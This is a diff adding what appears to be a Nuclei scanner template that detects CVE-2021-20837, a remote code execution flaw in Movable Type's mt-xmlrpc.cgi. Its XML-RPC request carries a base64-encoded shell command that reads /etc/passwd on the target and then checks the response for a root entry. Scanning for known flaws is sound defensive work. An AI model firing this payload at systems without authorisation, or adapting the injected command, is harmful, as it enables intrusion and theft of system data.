@@ -1,0 +1,23 @@
+id: CVE-2021-20837
+
+info:
+  name: RCE in MovableType
+  author: zin_min_phyo
+  severity: critical
+  reference: https://nemesis.sh/posts/movable-type-0day/
+  tags: MovableType,RCE
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/mt/mt-xmlrpc.cgi"
+
+    body: '<?xml version="1.0"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>YGNhdCAvZXRjL3Bhc3N3ZGA=</base64></value></param></params></methodCall>'
+
+
+  
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
